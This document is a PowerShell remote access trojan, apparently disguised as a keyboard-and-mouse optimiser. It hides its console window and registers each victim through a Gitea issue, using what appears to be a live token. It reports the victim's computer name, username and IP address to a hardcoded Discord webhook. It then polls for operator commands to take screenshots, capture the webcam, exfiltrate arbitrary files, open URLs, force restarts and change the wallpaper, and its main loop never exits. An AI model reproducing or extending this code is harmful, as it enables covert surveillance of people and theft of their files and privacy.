# =============== ADD THIS TO THE VERY TOP ===============
# Hide console window completely
Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE

# Redirect all output to null to prevent any console display
$null = [System.Console]::OpenStandardError()
$null = [System.Console]::OpenStandardOutput()
# ========================================================

# YOUR ORIGINAL SCRIPT STARTS HERE
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$main_webhook = "https://discord.com/api/webhooks/1447925854016508021/MnC95Tp9RwVh2bIWhpMvwcatZ-8oWUjscCVV4iyVFZa6bvpEiGL3woO38m11QbqMV0Ry"
$gitea_token = "baa9d69ca354aa7541028cd201d8062600d4291f"
$repo_owner = "Boosterr"
$repo_name = "KBM-Optimiser"

$computerName = $env:COMPUTERNAME
$username = $env:USERNAME

# Function to get IP with retry logic
function Get-IPAddress {
    $retryCount = 0
    while ($retryCount -lt 3) {
        try {
            $ip = (Invoke-RestMethod -Uri "http://api.ipify.org" -TimeoutSec 10).Trim()
            return $ip
        } catch {
            $retryCount++
            Start-Sleep 5
        }
    }
    return "Unknown"
}

$ip = Get-IPAddress

$headers = @{
    "Authorization" = "token $gitea_token"
    "Content-Type" = "application/json"
    "User-Agent" = "PowerShell-Script"
}

# Session establishment with infinite retry
$session_established = $false
while (-not $session_established) {
    try {
        $issueData = @{
            title = "Session: $computerName - $username - $ip"
            body = '{"command":"none","webhook":"pending"}'
        } | ConvertTo-Json

        $issueResponse = Invoke-RestMethod -Uri "https://gitea.com/api/v1/repos/$repo_owner/$repo_name/issues" -Method Post -Body $issueData -Headers $headers -TimeoutSec 30
        $issue_api = "https://gitea.com/api/v1/repos/$repo_owner/$repo_name/issues/$($issueResponse.number)"
        
        $sessionCommand = "CREATE_SESSION: $computerName $username $ip $($issueResponse.number)"
        $sessionBody = @{ content = $sessionCommand } | ConvertTo-Json
        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $sessionBody -ContentType "application/json" -TimeoutSec 30
        
        $session_issue_id = $issueResponse.number
        
        Start-Sleep 5
        
        $issue_data = Invoke-RestMethod -Uri $issue_api -Headers $headers -TimeoutSec 30
        $issue_body = $issue_data.body | ConvertFrom-Json
        $session_webhook = $issue_body.webhook
        
        # REMOVED: Write-Host "Session established! Webhook: $session_webhook"
        $session_established = $true
        
    } catch {
        # REMOVED: Write-Host "Failed to create session: $($_.Exception.Message)"
        # REMOVED: Write-Host "Retrying in 30 seconds..."
        Start-Sleep 30
    }
}

function Send-Screenshot {
    $screen = [Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
    
    $tempfile = "$env:temp\screenshot.png"
    $bitmap.Save($tempfile, [System.Drawing.Imaging.ImageFormat]::Png)
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileBytes = [System.IO.File]::ReadAllBytes($tempfile)
    $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
    $fileEnc = $enc.GetString($fileBytes)
    
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="screenshot.png"
Content-Type: image/png

$fileEnc
--$boundary
Content-Disposition: form-data; name="content"

Live screenshot from $computerName - $username
--$boundary--
"@

    try {
        if ($session_webhook -and $session_webhook -ne "pending") {
            Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30
        } else {
            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30
        }
    } catch {
        # REMOVED: Write-Host "Failed to send screenshot: $($_.Exception.Message)"
    }
    
    $graphics.Dispose()
    $bitmap.Dispose()
    Remove-Item $tempfile -ErrorAction SilentlyContinue
}

function Send-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        # Create webcam capture object (video device)
        $capture = New-Object System.Windows.Forms.PictureBox

        # Use Windows built-in COM object for camera: WIA
        $wia = New-Object -ComObject WIA.DeviceManager

        # Find video input device (webcam)
        $camera = $wia.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1

        if (-not $camera) {
            $errorBody = @{ content = "❌ Webcam not detected on $computerName" } | ConvertTo-Json
            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorBody -ContentType "application/json"
            return
        }

        # Connect to webcam
        $device = $camera.Connect()

        # Take picture
        $img = $device.ExecuteCommand("{AF933CAC-ACAD-11D2-A093-00C04F72DC3C}")

        # Save image
        $tempfile = "$env:temp\webcam.png"
        $img.SaveFile($tempfile)

        # Prepare multipart upload
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($tempfile)
        $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
        $fileEnc = $enc.GetString($fileBytes)

        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="webcam.png"
Content-Type: image/png

$fileEnc
--$boundary
Content-Disposition: form-data; name="content"

📷 Webcam capture from $computerName - $username
--$boundary--
"@

        # Send to correct webhook
        if ($session_webhook -and $session_webhook -ne "pending") {
            Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
        } else {
            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
        }

        Remove-Item $tempfile -ErrorAction SilentlyContinue
    }
    catch {
        $err = @{ content = "❌ Webcam error: $($_.Exception.Message)" } | ConvertTo-Json
        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $err -ContentType "application/json"
    }
}


function Open-URL {
    param([string]$url)
    
    try {
        Start-Process $url
        return $true
    } catch {
        # REMOVED: Write-Host "Method 1 failed: $($_.Exception.Message)"
    }
    
    $browsers = @(
        "chrome", "msedge", "firefox", "iexplore", "opera", "brave"
    )
    
    foreach ($browser in $browsers) {
        try {
            Start-Process $browser $url -ErrorAction SilentlyContinue
            Start-Sleep 1
            if (Get-Process $browser -ErrorAction SilentlyContinue) {
                return $true
            }
        } catch {
        }
    }
    
    try {
        $ie = New-Object -ComObject InternetExplorer.Application
        $ie.Visible = $true
        $ie.Navigate($url)
        return $true
    } catch {
        # REMOVED: Write-Host "Method 3 failed: $($_.Exception.Message)"
    }
    
    return $false
}

function Restart-Computer {
    try {
        Start-Process "shutdown.exe" -ArgumentList "/r", "/f", "/t", "0" -Wait
        return $true
    } catch {
        return $false
    }
}

function Set-Wallpaper {
    param([string]$imageUrl)
    
    try {
        $tempfile = "$env:temp\wallpaper.jpg"
        Invoke-WebRequest -Uri $imageUrl -OutFile $tempfile
        
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        
        [Wallpaper]::SystemParametersInfo(0x0014, 0, $tempfile, 0x01)
        return $true
    } catch {
        return $false
    }
}

function Send-File-ToDiscord {
    param([string]$filePath, [string]$fileName, [long]$fileSize)
    
    try {
        # REMOVED: Write-Host "Sending file directly to Discord..."
        
        # Read file bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        
        # Create multipart form data with file attachment
        $boundary = [System.Guid]::NewGuid().ToString()
        $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
        $fileEnc = $enc.GetString($fileBytes)
        
        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$fileEnc
--$boundary
Content-Disposition: form-data; name="content"

**File Downloaded Successfully**
**File:** $fileName
**Path:** $filePath
**Size:** $([math]::Round($fileSize/1KB, 2)) KB
**Computer:** $computerName
**User:** $username
--$boundary--
"@

        if ($session_webhook -and $session_webhook -ne "pending") {
            Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30
            # REMOVED: Write-Host "File sent to session webhook successfully!"
            return $true
        } else {
            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30
            # REMOVED: Write-Host "File sent to main webhook successfully!"
            return $true
        }
    } catch {
        # REMOVED: Write-Host "Error sending file to Discord: $($_.Exception.Message)"
        return $false
    }
}

function Download-File {
    param([string]$filePath)
    
    try {
        # REMOVED: Write-Host "Attempting to download file: $filePath"
        
        if (Test-Path $filePath) {
            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
            $fileName = Split-Path $filePath -Leaf
            $fileSize = $fileBytes.Length
            
            # REMOVED: Write-Host "File found: $fileName, Size: $fileSize bytes"
            
            # Check if file is too large for Discord (8MB limit)
            if ($fileSize -gt 8MB) {
                # REMOVED: Write-Host "File too large for Discord (over 8MB)"
                
                # Send error message
                $errorInfo = @{
                    fileName = $fileName
                    filePath = $filePath
                    fileSize = $fileSize
                    status = "FILE_TOO_LARGE"
                    message = "File is too large for Discord (over 8MB limit)"
                } | ConvertTo-Json -Depth 5
                
                if ($session_webhook -and $session_webhook -ne "pending") {
                    try {
                        Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                    } catch {
                        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                    }
                }
                
                return $false
            }
            
            # Send file directly to Discord
            $success = Send-File-ToDiscord -filePath $filePath -fileName $fileName -fileSize $fileSize
            
            if ($success) {
                # REMOVED: Write-Host "File sent to Discord successfully!"
                return $true
            } else {
                # REMOVED: Write-Host "Failed to send file to Discord"
                
                # Send error message
                $errorInfo = @{
                    fileName = $fileName
                    filePath = $filePath
                    status = "UPLOAD_FAILED"
                    message = "Failed to send file to Discord"
                } | ConvertTo-Json -Depth 5
                
                if ($session_webhook -and $session_webhook -ne "pending") {
                    try {
                        Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                    } catch {
                        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                    }
                }
                
                return $false
            }
        } else {
            # REMOVED: Write-Host "File not found: $filePath"
            
            # Send file not found message
            $errorInfo = @{
                filePath = $filePath
                status = "FILE_NOT_FOUND"
                message = "File does not exist on the target system"
            } | ConvertTo-Json -Depth 5
            
            if ($session_webhook -and $session_webhook -ne "pending") {
                try {
                    Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                } catch {
                    Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
                }
            }
            
            return $false
        }
    } catch {
        # REMOVED: Write-Host "Error sharing file: $($_.Exception.Message)"
        
        # Send error message
        $errorInfo = @{
            filePath = $filePath
            status = "ERROR"
            message = "Error: $($_.Exception.Message)"
        } | ConvertTo-Json -Depth 5
        
        if ($session_webhook -and $session_webhook -ne "pending") {
            try {
                Invoke-RestMethod -Uri $session_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
            } catch {
                Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorInfo -ContentType "application/json" -TimeoutSec 30
            }
        }
        
        return $false
    }
}

$last_command = "none"
# REMOVED: Write-Host "Starting command loop... Waiting for commands from Discord."

# Main loop with robust error handling - NEVER EXITS
while($true) {
    try {
        $issue_data = Invoke-RestMethod -Uri $issue_api -Headers $headers -TimeoutSec 30
        $raw_json = $issue_data.body
        # REMOVED: Write-Host "Raw JSON received: $raw_json"
        
        # FIX: Use a more robust JSON parsing method
        try {
            $command_data = $raw_json | ConvertFrom-Json -ErrorAction Stop
            $command = $command_data.command
        } catch {
            # If JSON parsing fails, try manual extraction
            # REMOVED: Write-Host "JSON parsing failed, trying manual extraction..."
            if ($raw_json -match '"command":"([^"]*)"') {
                $command = $matches[1]
                # REMOVED: Write-Host "Manually extracted command: $command"
            } else {
                $command = "none"
            }
        }
        
        if($command -ne "none" -and $command -ne $last_command) {
            # REMOVED: Write-Host "NEW COMMAND RECEIVED: $command"
            $last_command = $command
            
            # FIX: Convert forward slashes back to backslashes for file paths
            $fixedCommand = $command -replace '/', '\'
            
            if($fixedCommand.StartsWith("!website ")) {
                $url = $fixedCommand.Replace("!website ", "")
                # REMOVED: Write-Host "Opening website: $url"
                
                $success = Open-URL -url $url
                
                if ($success) {
                    $body = @{content = "Website opened: $url on $computerName"} | ConvertTo-Json
                } else {
                    $body = @{content = "Failed to open website: $url on $computerName"} | ConvertTo-Json
                }
                
                if ($session_webhook -and $session_webhook -ne "pending") {
                    try {
                        Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    } catch {
                        # REMOVED: Write-Host "Failed to send to session webhook, trying main webhook..."
                        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    }
                } else {
                    Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                }
                
                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
            elseif($fixedCommand -eq "!screenshot") {
                # REMOVED: Write-Host "Taking screenshot..."
                Send-Screenshot
                
                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
            elseif ($fixedCommand -eq "!webcam") {
                Send-Webcam

                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
            elseif($fixedCommand -eq "!restart") {
                # REMOVED: Write-Host "Restarting computer..."
                $success = Restart-Computer
                
                if ($success) {
                    $body = @{content = "Restart command executed on $computerName"} | ConvertTo-Json
                } else {
                    $body = @{content = "Failed to restart $computerName"} | ConvertTo-Json
                }
                
                if ($session_webhook -and $session_webhook -ne "pending") {
                    try {
                        Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    } catch {
                        # REMOVED: Write-Host "Failed to send to session webhook, trying main webhook..."
                        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    }
                } else {
                    Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                }
                
                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
            elseif($fixedCommand.StartsWith("!wallpaper ")) {
                $imageUrl = $fixedCommand.Replace("!wallpaper ", "")
                # REMOVED: Write-Host "Changing wallpaper: $imageUrl"
                
                $success = Set-Wallpaper -imageUrl $imageUrl
                
                if ($success) {
                    $body = @{content = "Wallpaper changed on $computerName"} | ConvertTo-Json
                } else {
                    $body = @{content = "Failed to change wallpaper on $computerName"} | ConvertTo-Json
                }
                
                if ($session_webhook -and $session_webhook -ne "pending") {
                    try {
                        Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    } catch {
                        # REMOVED: Write-Host "Failed to send to session webhook, trying main webhook..."
                        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                    }
                } else {
                    Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30
                }
                
                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
            elseif($fixedCommand.StartsWith("!filedownload ")) {
                $filePath = $fixedCommand.Replace("!filedownload ", "")
                # REMOVED: Write-Host "FILE DOWNLOAD COMMAND: $filePath"
                
                $success = Download-File -filePath $filePath
                
                if ($success) {
                    # REMOVED: Write-Host "File download process completed successfully"
                } else {
                    # REMOVED: Write-Host "File download process failed"
                }
                
                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                $last_command = "none"
            }
        }
        Start-Sleep 5
    }
    catch { 
        # REMOVED: Write-Host "Error in main loop: $($_.Exception.Message)"
        # REMOVED: Write-Host "Retrying in 30 seconds..."
        Start-Sleep 30
    }
}


